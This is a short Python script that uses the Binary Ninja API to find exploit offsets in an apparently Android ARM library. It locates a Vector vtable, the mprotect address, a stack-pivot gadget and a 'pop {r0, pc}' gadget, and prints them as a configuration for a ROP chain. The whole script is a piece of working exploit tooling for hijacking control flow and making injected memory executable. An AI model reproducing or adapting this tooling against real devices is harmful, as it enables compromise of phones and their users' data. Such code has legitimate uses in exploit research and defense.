#!/usr/bin/env python2
from __future__ import print_function
from binaryninja import *
import sys

bv = BinaryViewType["ELF"].open(sys.argv[1])
bv.update_analysis_and_wait()

# vtable
vtable_offset = bv.symbols['_ZTVN7android6VectorIjEE'].address + 8

# mprotect
mprotect_offset = bv.symbols['mprotect'].address

# pivot
pivot_asm = 'mov   lr, r0\n'
pivot_asm += 'ldmia lr, {r0-r12}\n'
pivot_asm += 'ldr   sp, [lr, #0x34]\n'
pivot_asm += 'ldr   lr, [lr, #0x3c]\n'
pivot_asm += 'bx    lr\n'
pivot_offset = bv.find_next_data(0, bv.arch.assemble(pivot_asm)[0])

# pop_r0_pc
pop_r0_pc = bv.find_next_data(0, bv.arch.assemble('pop {r0, pc}')[0])

print("{")
print("    'vtable_offset': 0x{:08x},".format(vtable_offset))
print("    'mprotect_offset': 0x{:08x},".format(mprotect_offset))
print("    'pivot_offset': 0x{:08x},".format(pivot_offset))
print("    'pop_r0_pc_offset': 0x{:08x}".format(pop_r0_pc))
print("}")
